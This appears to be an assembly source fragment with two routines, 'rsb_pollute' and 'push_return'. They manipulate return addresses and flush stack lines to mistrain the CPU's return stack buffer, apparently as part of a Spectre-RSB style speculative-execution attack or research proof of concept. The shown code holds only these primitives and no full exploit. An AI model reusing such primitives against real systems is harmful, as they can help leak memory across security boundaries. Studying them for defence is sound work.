.section .text
.globl rsb_pollute
.type rsb_pollute, @function
rsb_pollute:
#cpuid
pop %rdi
#clflush (%rsp)
#imfence
#cpuid
add $0x13, %rdi
jmp *%rdi



.section .text
.global push_return
.type push_return, @function
push_return:
push %rbp
lea  0x0(%rip), %rax
add $0xa, %rax
push %rax
#mov %rsp, %rax
#clflush (%rax)
clflush (%rsp)
ret
pop %rbp
jmp 0x400928


